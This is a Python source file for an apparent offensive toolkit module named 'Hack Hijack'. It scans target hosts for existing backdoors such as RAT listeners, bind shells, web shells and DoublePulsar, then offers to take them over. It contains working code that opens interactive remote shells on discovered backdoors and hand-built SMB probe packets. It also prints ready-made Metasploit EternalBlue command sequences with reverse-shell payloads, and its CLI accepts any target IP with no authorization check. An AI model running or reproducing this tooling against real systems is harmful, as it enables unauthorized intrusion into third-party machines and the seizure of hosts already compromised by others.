"""AUTARCH Hack Hijack Module

Scans target systems for signs of existing compromise — open backdoors,
known exploit artifacts, rogue services, suspicious listeners — then
provides tools to take over those footholds.

Detection signatures include:
- EternalBlue/DoublePulsar (MS17-010) backdoors
- Common RAT listeners (Meterpreter, Cobalt Strike, njRAT, etc.)
- Known backdoor ports and banner fingerprints
- Web shells on HTTP services
- Suspicious SSH authorized_keys or rogue SSHD
- Open reverse-shell listeners
- Rogue SOCKS/HTTP proxies
- Cryptocurrency miners
"""

DESCRIPTION = "Hijack already-compromised systems"
AUTHOR = "darkHal"
VERSION = "1.0"
CATEGORY = "offense"

import os
import json
import time
import socket
import struct
import threading
import subprocess
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field

try:
    from core.paths import find_tool, get_data_dir
except ImportError:
    import shutil
    def find_tool(name):
        return shutil.which(name)
    def get_data_dir():
        return str(Path(__file__).parent.parent / 'data')


# ── Known Backdoor Signatures ────────────────────────────────────────────────

@dataclass
class BackdoorSignature:
    name: str
    port: int
    protocol: str  # tcp / udp
    banner_pattern: str = ''       # regex or substring in banner
    probe: bytes = b''             # bytes to send to trigger banner
    description: str = ''
    category: str = 'generic'      # eternalblue, rat, webshell, miner, proxy, shell
    takeover_method: str = ''      # how to hijack


# Port-based detection signatures
BACKDOOR_SIGNATURES: List[BackdoorSignature] = [
    # ── EternalBlue / DoublePulsar ────────────────────────────────────────
    BackdoorSignature(
        name='DoublePulsar SMB Backdoor',
        port=445,
        protocol='tcp',
        description='NSA DoublePulsar implant via EternalBlue (MS17-010). '
                    'Detected by SMB Trans2 SESSION_SETUP anomaly.',
        category='eternalblue',
        takeover_method='doublepulsar_inject',
    ),

    # ── Common RAT / C2 Listeners ─────────────────────────────────────────
    BackdoorSignature(
        name='Meterpreter Reverse TCP',
        port=4444,
        protocol='tcp',
        banner_pattern='',
        description='Default Metasploit Meterpreter reverse TCP handler.',
        category='rat',
        takeover_method='meterpreter_session',
    ),
    BackdoorSignature(
        name='Meterpreter Bind TCP',
        port=4444,
        protocol='tcp',
        banner_pattern='',
        description='Metasploit bind shell / Meterpreter bind TCP.',
        category='rat',
        takeover_method='meterpreter_connect',
    ),
    BackdoorSignature(
        name='Cobalt Strike Beacon (HTTPS)',
        port=443,
        protocol='tcp',
        banner_pattern='',
        description='Cobalt Strike default HTTPS beacon listener.',
        category='rat',
        takeover_method='beacon_takeover',
    ),
    BackdoorSignature(
        name='Cobalt Strike Beacon (HTTP)',
        port=80,
        protocol='tcp',
        banner_pattern='',
        description='Cobalt Strike HTTP beacon listener.',
        category='rat',
        takeover_method='beacon_takeover',
    ),
    BackdoorSignature(
        name='Cobalt Strike DNS',
        port=53,
        protocol='udp',
        description='Cobalt Strike DNS beacon channel.',
        category='rat',
        takeover_method='dns_tunnel_hijack',
    ),
    BackdoorSignature(
        name='njRAT',
        port=5552,
        protocol='tcp',
        banner_pattern='njRAT',
        description='njRAT default C2 port.',
        category='rat',
        takeover_method='generic_connect',
    ),
    BackdoorSignature(
        name='DarkComet',
        port=1604,
        protocol='tcp',
        banner_pattern='',
        description='DarkComet RAT default port.',
        category='rat',
        takeover_method='generic_connect',
    ),
    BackdoorSignature(
        name='Quasar RAT',
        port=4782,
        protocol='tcp',
        description='Quasar RAT default listener.',
        category='rat',
        takeover_method='generic_connect',
    ),
    BackdoorSignature(
        name='AsyncRAT',
        port=6606,
        protocol='tcp',
        description='AsyncRAT default C2 port.',
        category='rat',
        takeover_method='generic_connect',
    ),
    BackdoorSignature(
        name='Gh0st RAT',
        port=8000,
        protocol='tcp',
        banner_pattern='Gh0st',
        probe=b'Gh0st\x00',
        description='Gh0st RAT C2 communication.',
        category='rat',
        takeover_method='generic_connect',
    ),
    BackdoorSignature(
        name='Poison Ivy',
        port=3460,
        protocol='tcp',
        description='Poison Ivy RAT default port.',
        category='rat',
        takeover_method='generic_connect',
    ),

    # ── Shell Backdoors ───────────────────────────────────────────────────
    BackdoorSignature(
        name='Netcat Listener',
        port=4445,
        protocol='tcp',
        description='Common netcat reverse/bind shell port.',
        category='shell',
        takeover_method='raw_shell',
    ),
    BackdoorSignature(
        name='Bind Shell (31337)',
        port=31337,
        protocol='tcp',
        description='Classic "elite" backdoor port.',
        category='shell',
        takeover_method='raw_shell',
    ),
    BackdoorSignature(
        name='Bind Shell (1337)',
        port=1337,
        protocol='tcp',
        description='Common backdoor/bind shell port.',
        category='shell',
        takeover_method='raw_shell',
    ),
    BackdoorSignature(
        name='Telnet Backdoor',
        port=23,
        protocol='tcp',
        banner_pattern='login:',
        description='Telnet service — often left open with weak/default creds.',
        category='shell',
        takeover_method='telnet_bruteforce',
    ),

    # ── Web Shells ────────────────────────────────────────────────────────
    BackdoorSignature(
        name='PHP Web Shell (8080)',
        port=8080,
        protocol='tcp',
        banner_pattern='',
        description='HTTP service on non-standard port — check for web shells.',
        category='webshell',
        takeover_method='webshell_detect',
    ),
    BackdoorSignature(
        name='PHP Web Shell (8888)',
        port=8888,
        protocol='tcp',
        description='HTTP service on port 8888 — common web shell host.',
        category='webshell',
        takeover_method='webshell_detect',
    ),

    # ── Proxies / Tunnels ─────────────────────────────────────────────────
    BackdoorSignature(
        name='SOCKS Proxy',
        port=1080,
        protocol='tcp',
        description='SOCKS proxy — may be a pivot point.',
        category='proxy',
        takeover_method='socks_connect',
    ),
    BackdoorSignature(
        name='SOCKS5 Proxy (9050)',
        port=9050,
        protocol='tcp',
        description='Tor SOCKS proxy or attacker pivot.',
        category='proxy',
        takeover_method='socks_connect',
    ),
    BackdoorSignature(
        name='HTTP Proxy (3128)',
        port=3128,
        protocol='tcp',
        description='Squid/HTTP proxy — possible attacker tunnel.',
        category='proxy',
        takeover_method='http_proxy_use',
    ),
    BackdoorSignature(
        name='SSH Tunnel (2222)',
        port=2222,
        protocol='tcp',
        banner_pattern='SSH-',
        description='Non-standard SSH — possibly attacker-planted SSHD.',
        category='shell',
        takeover_method='ssh_connect',
    ),

    # ── Miners ────────────────────────────────────────────────────────────
    BackdoorSignature(
        name='Cryptominer Stratum',
        port=3333,
        protocol='tcp',
        banner_pattern='mining',
        description='Stratum mining protocol — cryptojacking indicator.',
        category='miner',
        takeover_method='miner_redirect',
    ),
    BackdoorSignature(
        name='Cryptominer (14444)',
        port=14444,
        protocol='tcp',
        description='Common XMR mining pool port.',
        category='miner',
        takeover_method='miner_redirect',
    ),
]

# Additional ports to probe beyond signature list
EXTRA_SUSPICIOUS_PORTS = [
    1234, 1337, 2323, 3389, 4321, 4443, 4444, 4445, 5555, 5900,
    6660, 6666, 6667, 6697, 7777, 8443, 9001, 9090, 9999,
    12345, 17321, 17322, 20000, 27015, 31337, 33890, 40000,
    41337, 43210, 50000, 54321, 55553, 65535,
]


# ── Scan Result Types ─────────────────────────────────────────────────────────

@dataclass
class PortResult:
    port: int
    protocol: str
    state: str  # open, closed, filtered
    banner: str = ''
    service: str = ''


@dataclass
class BackdoorHit:
    signature: str         # name from BackdoorSignature
    port: int
    confidence: str        # high, medium, low
    banner: str = ''
    details: str = ''
    category: str = ''
    takeover_method: str = ''


@dataclass
class ScanResult:
    target: str
    scan_time: str
    duration: float
    open_ports: List[PortResult] = field(default_factory=list)
    backdoors: List[BackdoorHit] = field(default_factory=list)
    os_guess: str = ''
    smb_info: Dict[str, Any] = field(default_factory=dict)
    nmap_raw: str = ''

    def to_dict(self) -> dict:
        return {
            'target': self.target,
            'scan_time': self.scan_time,
            'duration': round(self.duration, 2),
            'open_ports': [
                {'port': p.port, 'protocol': p.protocol,
                 'state': p.state, 'banner': p.banner, 'service': p.service}
                for p in self.open_ports
            ],
            'backdoors': [
                {'signature': b.signature, 'port': b.port,
                 'confidence': b.confidence, 'banner': b.banner,
                 'details': b.details, 'category': b.category,
                 'takeover_method': b.takeover_method}
                for b in self.backdoors
            ],
            'os_guess': self.os_guess,
            'smb_info': self.smb_info,
        }


# ── Hack Hijack Service ──────────────────────────────────────────────────────

class HackHijackService:
    """Scans for existing compromises and provides takeover capabilities."""

    def __init__(self):
        self._data_dir = os.path.join(get_data_dir(), 'hack_hijack')
        os.makedirs(self._data_dir, exist_ok=True)
        self._scans_file = os.path.join(self._data_dir, 'scans.json')
        self._scans: List[dict] = []
        self._load_scans()
        self._active_sessions: Dict[str, dict] = {}

    def _load_scans(self):
        if os.path.exists(self._scans_file):
            try:
                with open(self._scans_file, 'r') as f:
                    self._scans = json.load(f)
            except Exception:
                self._scans = []

    def _save_scans(self):
        with open(self._scans_file, 'w') as f:
            json.dump(self._scans[-100:], f, indent=2)  # keep last 100

    # ── Port Scanning ─────────────────────────────────────────────────────

    def scan_target(self, target: str, scan_type: str = 'quick',
                    custom_ports: List[int] = None,
                    timeout: float = 3.0,
                    progress_cb=None) -> ScanResult:
        """Scan a target for open ports and backdoor indicators.

        scan_type: 'quick' (signature ports only), 'full' (signature + extra),
                   'nmap' (use nmap if available), 'custom' (user-specified ports)
        """
        start = time.time()
        result = ScanResult(
            target=target,
            scan_time=datetime.now(timezone.utc).isoformat(),
            duration=0.0,
        )

        # Build port list
        ports = set()
        if scan_type == 'custom' and custom_ports:
            ports = set(custom_ports)
        else:
            # Always include signature ports
            for sig in BACKDOOR_SIGNATURES:
                ports.add(sig.port)
            if scan_type in ('full', 'nmap'):
                ports.update(EXTRA_SUSPICIOUS_PORTS)

        # Try nmap first if requested and available
        if scan_type == 'nmap':
            nmap_result = self._nmap_scan(target, ports, timeout)
            if nmap_result:
                result.open_ports = nmap_result.get('ports', [])
                result.os_guess = nmap_result.get('os', '')
                result.nmap_raw = nmap_result.get('raw', '')

        # Fallback: socket-based scan
        if not result.open_ports:
            sorted_ports = sorted(ports)
            total = len(sorted_ports)
            results_lock = threading.Lock()
            open_ports = []

            def scan_port(port):
                pr = self._check_port(target, port, timeout)
                if pr and pr.state == 'open':
                    with results_lock:
                        open_ports.append(pr)

            # Threaded scan — 50 concurrent threads
            threads = []
            for i, port in enumerate(sorted_ports):
                t = threading.Thread(target=scan_port, args=(port,), daemon=True)
                threads.append(t)
                t.start()
                if len(threads) >= 50:
                    for t in threads:
                        t.join(timeout=timeout + 2)
                    threads.clear()
                if progress_cb and i % 10 == 0:
                    progress_cb(i, total)
            for t in threads:
                t.join(timeout=timeout + 2)

            result.open_ports = sorted(open_ports, key=lambda p: p.port)

        # Match open ports against backdoor signatures
        result.backdoors = self._match_signatures(target, result.open_ports, timeout)

        # Check SMB specifically for EternalBlue
        if any(p.port == 445 and p.state == 'open' for p in result.open_ports):
            result.smb_info = self._check_smb(target, timeout)
            # Check DoublePulsar
            dp_result = self._check_doublepulsar(target, timeout)
            if dp_result:
                result.backdoors.append(dp_result)

        result.duration = time.time() - start

        # Save scan
        scan_dict = result.to_dict()
        self._scans.append(scan_dict)
        self._save_scans()

        return result

    def _check_port(self, host: str, port: int, timeout: float) -> Optional[PortResult]:
        """TCP connect scan on a single port with banner grab."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            if result == 0:
                banner = ''
                service = ''
                try:
                    # Try to grab banner
                    sock.settimeout(2.0)
                    # Send probe for known ports
                    probe = self._get_probe(port)
                    if probe:
                        sock.send(probe)
                    banner = sock.recv(1024).decode('utf-8', errors='replace').strip()
                    service = self._identify_service(port, banner)
                except Exception:
                    service = self._identify_service(port, '')
                sock.close()
                return PortResult(port=port, protocol='tcp', state='open',
                                  banner=banner[:512], service=service)
            sock.close()
        except Exception:
            pass
        return None

    def _get_probe(self, port: int) -> bytes:
        """Return an appropriate probe for known ports."""
        probes = {
            21: b'',        # FTP sends banner automatically
            22: b'',        # SSH sends banner automatically
            23: b'',        # Telnet sends banner automatically
            25: b'',        # SMTP sends banner
            80: b'GET / HTTP/1.0\r\nHost: localhost\r\n\r\n',
            110: b'',       # POP3 banner
            143: b'',       # IMAP banner
            443: b'',       # HTTPS — won't get plaintext banner
            3306: b'',      # MySQL banner
            3389: b'',      # RDP — binary protocol
            5432: b'',      # PostgreSQL
            6379: b'INFO\r\n',  # Redis
            8080: b'GET / HTTP/1.0\r\nHost: localhost\r\n\r\n',
            8443: b'',
            8888: b'GET / HTTP/1.0\r\nHost: localhost\r\n\r\n',
            27017: b'',     # MongoDB
        }
        # Check backdoor signatures for specific probes
        for sig in BACKDOOR_SIGNATURES:
            if sig.port == port and sig.probe:
                return sig.probe
        return probes.get(port, b'')

    def _identify_service(self, port: int, banner: str) -> str:
        """Identify service from port number and banner."""
        bl = banner.lower()
        if 'ssh-' in bl:
            return 'SSH'
        if 'ftp' in bl:
            return 'FTP'
        if 'smtp' in bl or '220 ' in bl:
            return 'SMTP'
        if 'http' in bl:
            return 'HTTP'
        if 'mysql' in bl:
            return 'MySQL'
        if 'redis' in bl:
            return 'Redis'
        if 'mongo' in bl:
            return 'MongoDB'
        if 'postgresql' in bl:
            return 'PostgreSQL'

        well_known = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
            53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
            443: 'HTTPS', 445: 'SMB', 993: 'IMAPS', 995: 'POP3S',
            1080: 'SOCKS', 1433: 'MSSQL', 1521: 'Oracle',
            3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
            5900: 'VNC', 6379: 'Redis', 8080: 'HTTP-Alt',
            8443: 'HTTPS-Alt', 27017: 'MongoDB',
        }
        return well_known.get(port, 'unknown')

    def _match_signatures(self, host: str, open_ports: List[PortResult],
                          timeout: float) -> List[BackdoorHit]:
        """Match open ports against backdoor signatures."""
        hits = []
        port_map = {p.port: p for p in open_ports}

        for sig in BACKDOOR_SIGNATURES:
            if sig.port not in port_map:
                continue
            port_info = port_map[sig.port]
            confidence = 'low'
            details = ''

            # Banner match raises confidence
            if sig.banner_pattern and sig.banner_pattern.lower() in port_info.banner.lower():
                confidence = 'high'
                details = f'Banner matches: {sig.banner_pattern}'
            elif port_info.banner:
                # Port open with some banner — medium
                confidence = 'medium'
                details = f'Port open, banner: {port_info.banner[:100]}'
            else:
                # Port open but no banner — check if it's a well-known service
                if port_info.service in ('SSH', 'HTTP', 'HTTPS', 'FTP', 'SMTP',
                                          'DNS', 'MySQL', 'PostgreSQL', 'RDP'):
                    # Legitimate service likely — low confidence for backdoor
                    confidence = 'low'
                    details = f'Port open — likely legitimate {port_info.service}'
                else:
                    confidence = 'medium'
                    details = 'Port open, no banner — suspicious'

            hits.append(BackdoorHit(
                signature=sig.name,
                port=sig.port,
                confidence=confidence,
                banner=port_info.banner[:256],
                details=details,
                category=sig.category,
                takeover_method=sig.takeover_method,
            ))

        return hits

    # ── SMB / EternalBlue Detection ───────────────────────────────────────

    def _check_smb(self, host: str, timeout: float) -> dict:
        """Check SMB service details."""
        info = {'vulnerable': False, 'version': '', 'os': '', 'signing': ''}
        nmap = find_tool('nmap')
        if not nmap:
            return info
        try:
            cmd = [nmap, '-Pn', '-p', '445', '--script',
                   'smb-os-discovery,smb-security-mode,smb-vuln-ms17-010',
                   '-oN', '-', host]
            result = subprocess.run(cmd, capture_output=True, text=True,
                                    timeout=30)
            output = result.stdout
            info['raw'] = output
            if 'VULNERABLE' in output or 'ms17-010' in output.lower():
                info['vulnerable'] = True
            if 'OS:' in output:
                for line in output.splitlines():
                    if 'OS:' in line:
                        info['os'] = line.split('OS:')[1].strip()
                        break
            if 'message_signing' in output.lower():
                if 'disabled' in output.lower():
                    info['signing'] = 'disabled'
                elif 'enabled' in output.lower():
                    info['signing'] = 'enabled'
        except Exception as e:
            info['error'] = str(e)
        return info

    def _check_doublepulsar(self, host: str, timeout: float) -> Optional[BackdoorHit]:
        """Check for DoublePulsar SMB implant via Trans2 SESSION_SETUP probe.

        DoublePulsar responds to a specific SMB Trans2 SESSION_SETUP with
        a modified multiplex ID (STATUS_NOT_IMPLEMENTED + MID manipulation).
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, 445))

            # SMB negotiate
            negotiate = (
                b'\x00\x00\x00\x85'  # NetBIOS
                b'\xff\x53\x4d\x42'  # SMB
                b'\x72'              # Negotiate
                b'\x00\x00\x00\x00'  # Status
                b'\x18\x53\xc0'      # Flags
                b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                b'\x00\x00\xff\xff\xff\xfe\x00\x00'
                b'\x00\x00\x00\x00\x00\x62\x00'
                b'\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b'
                b'\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e'
                b'\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e'
                b'\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20'
                b'\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f'
                b'\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c'
                b'\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c'
                b'\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e'
                b'\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00'
            )
            sock.send(negotiate)
            sock.recv(1024)

            # SMB Trans2 SESSION_SETUP (DoublePulsar detection probe)
            trans2 = (
                b'\x00\x00\x00\x4e'  # NetBIOS
                b'\xff\x53\x4d\x42'  # SMB header
                b'\x32'              # Trans2
                b'\x00\x00\x00\x00'  # Status
                b'\x18\x07\xc0'      # Flags
                b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                b'\x00\x00\x00\x00\xff\xfe\x00\x08'  # MID=0x0800
                b'\x00\x00\x0f\x0c\x00\x00\x00\x01'
                b'\x00\x00\x00\x00\x00\x00\x00'
                b'\xa6\xd9\xa4\x00\x00\x00\x00\x00'
                b'\x00\x0e\x00\x00\x00\x0c\x00\x42\x00'
                b'\x00\x00\x00\x00\x01\x00\x0e\x00'
                b'\x00\x00\x0c\x00\x00\x00\x00\x00'
            )
            sock.send(trans2)
            resp = sock.recv(1024)
            sock.close()

            if len(resp) >= 36:
                # Check multiplex ID — DoublePulsar modifies it
                mid = struct.unpack('<H', resp[34:36])[0]
                if mid != 0x0041 and mid != 0x0000 and mid != 0x0800:
                    # Non-standard MID response — likely DoublePulsar
                    arch = 'x86' if (mid & 0x01) else 'x64'
                    return BackdoorHit(
                        signature='DoublePulsar SMB Backdoor (CONFIRMED)',
                        port=445,
                        confidence='high',
                        details=f'DoublePulsar implant detected (arch: {arch}, '
                                f'MID=0x{mid:04x}). System was exploited via EternalBlue.',
                        category='eternalblue',
                        takeover_method='doublepulsar_inject',
                    )
        except Exception:
            pass
        return None

    # ── Nmap Integration ──────────────────────────────────────────────────

    def _nmap_scan(self, host: str, ports: set, timeout: float) -> Optional[dict]:
        """Use nmap for comprehensive scan if available."""
        nmap = find_tool('nmap')
        if not nmap:
            return None
        try:
            port_str = ','.join(str(p) for p in sorted(ports))
            cmd = [nmap, '-Pn', '-sV', '-O', '--version-intensity', '5',
                   '-p', port_str, '-oN', '-', host]
            result = subprocess.run(cmd, capture_output=True, text=True,
                                    timeout=120)
            output = result.stdout
            parsed_ports = []
            os_guess = ''

            for line in output.splitlines():
                # Parse port lines: "445/tcp open  microsoft-ds"
                if '/tcp' in line or '/udp' in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        port_proto = parts[0].split('/')
                        if len(port_proto) == 2 and parts[1] == 'open':
                            parsed_ports.append(PortResult(
                                port=int(port_proto[0]),
                                protocol=port_proto[1],
                                state='open',
                                service=' '.join(parts[2:]),
                            ))
                if 'OS details:' in line:
                    os_guess = line.split('OS details:')[1].strip()
                elif 'Running:' in line:
                    os_guess = os_guess or line.split('Running:')[1].strip()

            return {
                'ports': parsed_ports,
                'os': os_guess,
                'raw': output,
            }
        except Exception:
            return None

    # ── Takeover Methods ──────────────────────────────────────────────────

    def connect_raw_shell(self, host: str, port: int,
                          timeout: float = 5.0) -> dict:
        """Connect to a raw bind shell (netcat-style)."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            # Try to get initial output
            try:
                sock.settimeout(2.0)
                initial = sock.recv(4096).decode('utf-8', errors='replace')
            except Exception:
                initial = ''
            session_id = f'shell_{host}_{port}_{int(time.time())}'
            self._active_sessions[session_id] = {
                'type': 'raw_shell',
                'host': host,
                'port': port,
                'socket': sock,
                'connected_at': datetime.now(timezone.utc).isoformat(),
            }
            return {
                'ok': True,
                'session_id': session_id,
                'initial_output': initial,
                'message': f'Connected to bind shell at {host}:{port}',
            }
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def shell_execute(self, session_id: str, command: str,
                      timeout: float = 10.0) -> dict:
        """Execute a command on an active shell session."""
        session = self._active_sessions.get(session_id)
        if not session:
            return {'ok': False, 'error': 'Session not found'}
        sock = session.get('socket')
        if not sock:
            return {'ok': False, 'error': 'No socket for session'}
        try:
            sock.settimeout(timeout)
            sock.send((command + '\n').encode())
            time.sleep(0.5)
            output = b''
            sock.settimeout(2.0)
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    output += chunk
                except socket.timeout:
                    break
            return {
                'ok': True,
                'output': output.decode('utf-8', errors='replace'),
            }
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def close_session(self, session_id: str) -> dict:
        """Close an active session."""
        session = self._active_sessions.pop(session_id, None)
        if not session:
            return {'ok': False, 'error': 'Session not found'}
        sock = session.get('socket')
        if sock:
            try:
                sock.close()
            except Exception:
                pass
        return {'ok': True, 'message': 'Session closed'}

    def list_sessions(self) -> List[dict]:
        """List active takeover sessions."""
        return [
            {
                'session_id': sid,
                'type': s['type'],
                'host': s['host'],
                'port': s['port'],
                'connected_at': s['connected_at'],
            }
            for sid, s in self._active_sessions.items()
        ]

    def attempt_takeover(self, host: str, backdoor: dict) -> dict:
        """Attempt to take over a detected backdoor.

        Routes to the appropriate takeover method based on the signature.
        """
        method = backdoor.get('takeover_method', '')
        port = backdoor.get('port', 0)

        if method == 'raw_shell':
            return self.connect_raw_shell(host, port)

        if method == 'meterpreter_connect':
            return self._takeover_via_msf(host, port, 'meterpreter')

        if method == 'meterpreter_session':
            return self._takeover_via_msf(host, port, 'meterpreter')

        if method == 'doublepulsar_inject':
            return self._takeover_doublepulsar(host)

        if method == 'ssh_connect':
            return {'ok': False,
                    'message': f'SSH detected on {host}:{port}. '
                               'Use Offense → Reverse Shell for SSH access, '
                               'or try default credentials.'}

        if method == 'webshell_detect':
            return self._detect_webshell(host, port)

        if method == 'socks_connect':
            return {'ok': True,
                    'message': f'SOCKS proxy at {host}:{port}. '
                               f'Configure proxychains: socks5 {host} {port}'}

        if method == 'http_proxy_use':
            return {'ok': True,
                    'message': f'HTTP proxy at {host}:{port}. '
                               f'export http_proxy=http://{host}:{port}'}

        if method == 'generic_connect':
            return self.connect_raw_shell(host, port)

        return {'ok': False, 'error': f'No takeover handler for method: {method}'}

    def _takeover_via_msf(self, host: str, port: int, payload_type: str) -> dict:
        """Attempt takeover using Metasploit if available."""
        try:
            from core.msf_interface import get_msf_interface
            msf = get_msf_interface()
            if not msf.is_connected:
                return {'ok': False,
                        'error': 'Metasploit not connected. Connect via Offense page first.'}
            # Use multi/handler to connect to bind shell
            return {
                'ok': True,
                'message': f'Metasploit available. Create handler: '
                           f'use exploit/multi/handler; '
                           f'set PAYLOAD windows/meterpreter/bind_tcp; '
                           f'set RHOST {host}; set LPORT {port}; exploit',
                'msf_command': f'use exploit/multi/handler\n'
                               f'set PAYLOAD windows/meterpreter/bind_tcp\n'
                               f'set RHOST {host}\nset LPORT {port}\nexploit',
            }
        except ImportError:
            return {'ok': False, 'error': 'Metasploit module not available'}

    def _takeover_doublepulsar(self, host: str) -> dict:
        """Provide DoublePulsar exploitation guidance."""
        return {
            'ok': True,
            'message': f'DoublePulsar detected on {host}:445. Use Metasploit:\n'
                       f'  use exploit/windows/smb/ms17_010_eternalblue\n'
                       f'  set RHOSTS {host}\n'
                       f'  set PAYLOAD windows/x64/meterpreter/reverse_tcp\n'
                       f'  set LHOST <your-ip>\n'
                       f'  exploit\n\n'
                       f'Or inject DLL via existing DoublePulsar implant:\n'
                       f'  use exploit/windows/smb/ms17_010_psexec\n'
                       f'  set RHOSTS {host}\n'
                       f'  exploit',
            'msf_command': f'use exploit/windows/smb/ms17_010_eternalblue\n'
                           f'set RHOSTS {host}\n'
                           f'set PAYLOAD windows/x64/meterpreter/reverse_tcp\n'
                           f'exploit',
        }

    def _detect_webshell(self, host: str, port: int) -> dict:
        """Probe HTTP service for common web shells."""
        shells_found = []
        common_paths = [
            '/cmd.php', '/shell.php', '/c99.php', '/r57.php',
            '/webshell.php', '/backdoor.php', '/upload.php',
            '/cmd.asp', '/shell.asp', '/cmd.aspx', '/shell.aspx',
            '/cmd.jsp', '/shell.jsp',
            '/.hidden/shell.php', '/images/shell.php',
            '/uploads/shell.php', '/tmp/shell.php',
            '/wp-content/uploads/shell.php',
            '/wp-includes/shell.php',
        ]
        try:
            import requests as req
            for path in common_paths:
                try:
                    r = req.get(f'http://{host}:{port}{path}', timeout=3,
                                allow_redirects=False)
                    if r.status_code == 200 and len(r.text) > 0:
                        # Check if it looks like a shell
                        text = r.text.lower()
                        indicators = ['execute', 'command', 'shell', 'system(',
                                      'passthru', 'exec(', 'cmd', 'uname',
                                      'phpinfo', 'eval(']
                        if any(ind in text for ind in indicators):
                            shells_found.append({
                                'path': path,
                                'size': len(r.text),
                                'status': r.status_code,
                            })
                except Exception:
                    continue
        except ImportError:
            return {'ok': False, 'error': 'requests library not available for web shell detection'}

        if shells_found:
            return {
                'ok': True,
                'message': f'Found {len(shells_found)} web shell(s) on {host}:{port}',
                'shells': shells_found,
            }
        return {
            'ok': True,
            'message': f'No common web shells found on {host}:{port}',
            'shells': [],
        }

    # ── History ───────────────────────────────────────────────────────────

    def get_scan_history(self) -> List[dict]:
        return list(reversed(self._scans))

    def clear_history(self) -> dict:
        self._scans.clear()
        self._save_scans()
        return {'ok': True, 'message': 'Scan history cleared'}


# ── Singleton ─────────────────────────────────────────────────────────────────

_instance = None
_lock = threading.Lock()


def get_hack_hijack() -> HackHijackService:
    global _instance
    if _instance is None:
        with _lock:
            if _instance is None:
                _instance = HackHijackService()
    return _instance


# ── CLI ───────────────────────────────────────────────────────────────────────

def run():
    """Interactive CLI for Hack Hijack."""
    svc = get_hack_hijack()

    while True:
        print("\n╔═══════════════════════════════════════╗")
        print("║        HACK HIJACK — Takeover         ║")
        print("╠═══════════════════════════════════════╣")
        print("║  1 — Quick Scan (backdoor ports)      ║")
        print("║  2 — Full Scan (all suspicious)       ║")
        print("║  3 — Nmap Deep Scan                   ║")
        print("║  4 — View Scan History                ║")
        print("║  5 — Active Sessions                  ║")
        print("║  0 — Back                             ║")
        print("╚═══════════════════════════════════════╝")

        choice = input("\n  Select: ").strip()

        if choice == '0':
            break
        elif choice in ('1', '2', '3'):
            target = input("  Target IP: ").strip()
            if not target:
                continue
            scan_type = {'1': 'quick', '2': 'full', '3': 'nmap'}[choice]
            print(f"\n  Scanning {target} ({scan_type})...")

            def progress(current, total):
                print(f"    [{current}/{total}] ports scanned", end='\r')

            result = svc.scan_target(target, scan_type=scan_type,
                                     progress_cb=progress)
            print(f"\n  Scan complete in {result.duration:.1f}s")
            print(f"  Open ports: {len(result.open_ports)}")

            if result.open_ports:
                print("\n  PORT      STATE   SERVICE    BANNER")
                print("  " + "-" * 60)
                for p in result.open_ports:
                    banner = p.banner[:40] if p.banner else ''
                    print(f"  {p.port:<9} {p.state:<7} {p.service:<10} {banner}")

            if result.backdoors:
                print(f"\n  BACKDOOR INDICATORS ({len(result.backdoors)}):")
                print("  " + "-" * 60)
                for i, bd in enumerate(result.backdoors, 1):
                    color = {'high': '\033[91m', 'medium': '\033[93m',
                             'low': '\033[90m'}.get(bd.confidence, '')
                    reset = '\033[0m'
                    print(f"  {i}. {color}[{bd.confidence.upper()}]{reset} "
                          f"{bd.signature} (port {bd.port})")
                    if bd.details:
                        print(f"     {bd.details}")

                # Offer takeover
                try:
                    sel = input("\n  Attempt takeover? Enter # (0=skip): ").strip()
                    if sel and sel != '0':
                        idx = int(sel) - 1
                        if 0 <= idx < len(result.backdoors):
                            bd = result.backdoors[idx]
                            bd_dict = {
                                'port': bd.port,
                                'takeover_method': bd.takeover_method,
                            }
                            r = svc.attempt_takeover(target, bd_dict)
                            if r.get('ok'):
                                print(f"\n  {r.get('message', 'Success')}")
                                if r.get('session_id'):
                                    print(f"  Session: {r['session_id']}")
                                    # Interactive shell
                                    while True:
                                        cmd = input(f"  [{target}]$ ").strip()
                                        if cmd in ('exit', 'quit', ''):
                                            svc.close_session(r['session_id'])
                                            break
                                        out = svc.shell_execute(r['session_id'], cmd)
                                        if out.get('ok'):
                                            print(out.get('output', ''))
                                        else:
                                            print(f"  Error: {out.get('error')}")
                            else:
                                print(f"\n  Failed: {r.get('error', 'Unknown error')}")
                except (ValueError, IndexError):
                    pass

            if result.smb_info.get('vulnerable'):
                print("\n  [!] SMB MS17-010 (EternalBlue) VULNERABLE")
                print(f"      OS: {result.smb_info.get('os', 'unknown')}")
                print(f"      Signing: {result.smb_info.get('signing', 'unknown')}")

            if result.os_guess:
                print(f"\n  OS Guess: {result.os_guess}")

        elif choice == '4':
            history = svc.get_scan_history()
            if not history:
                print("\n  No scan history.")
                continue
            print(f"\n  Scan History ({len(history)} scans):")
            for i, scan in enumerate(history[:20], 1):
                bds = len(scan.get('backdoors', []))
                high = sum(1 for b in scan.get('backdoors', [])
                           if b.get('confidence') == 'high')
